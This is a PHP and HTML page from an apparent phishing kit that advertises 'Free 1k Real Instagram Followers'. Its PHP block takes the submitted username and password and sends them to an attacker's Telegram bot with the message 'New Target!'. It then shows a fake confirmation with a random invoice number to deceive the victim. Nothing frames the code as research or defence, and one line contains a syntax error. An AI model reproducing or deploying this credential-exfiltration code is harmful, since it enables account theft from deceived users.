--<?php
require "setting.php";
$user=$_POST['username'];
$pass=$_POST['password'];
try{
$resp=file_get_contents("https://api.telegram.org/bot{$Token}/sendMessage?chat_id={$user_id}&text=New Target! Xmoxd-->(user:{$user})password:{$pass}"
}
catch (Exception $ex)
{
    header('location: index.html');
}
function randomNumber($length) {
    $result = '';

    for($i = 0; $i < $length; $i++) {
        $result .= mt_rand(0, 9);
    }

    return $result;
}
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        label{
    font-size: 25px;
}
input {
    font-family: tahoma;
    width: 40%;
    border: 0;
    border-bottom: 2px solid gray;
    outline: 0;
    font-size: 1.3rem;
    color: #fff;
    padding: 7px 0;
    background: 0 0;
    transition: border-color .2s
}

.form__field:focus {
    border-bottom: 2px solid #CE0075
}
/* Telegram Channel: @rmsup */
.form__field:hover {
    border-bottom: 2px solid #CE0075
}
    </style>
    <title>Free Followers</title>
    <script language="javascript" type="text/javascript">
function windowClose() {
window.open('','_parent','');
window.close();
}
</script>
<link rel="icon" href="images/1.ico">
</head>
<body>
<h1 id="title" >Free 1k Real Instagram Followers</h1>
 <div class="panel">
     <div class="content">
     <h1> Request Status: </h1>
     <ul>
          <li style = "color: lime;"> Your request has been registered. </li>
          <li> Invoice number <?php
          echo "#".randomNumber(6);
          ?> </li>
          <li> If you meet the conditions, your followers will be deposited within the next 72 hours. </li>
      </ul>
     <br>
     <button onclick="Close()">Submit another page</button>
     <br>
    </div>
 </div>
</body>
<script src="JavaScript/js.js">
</script>
</html>
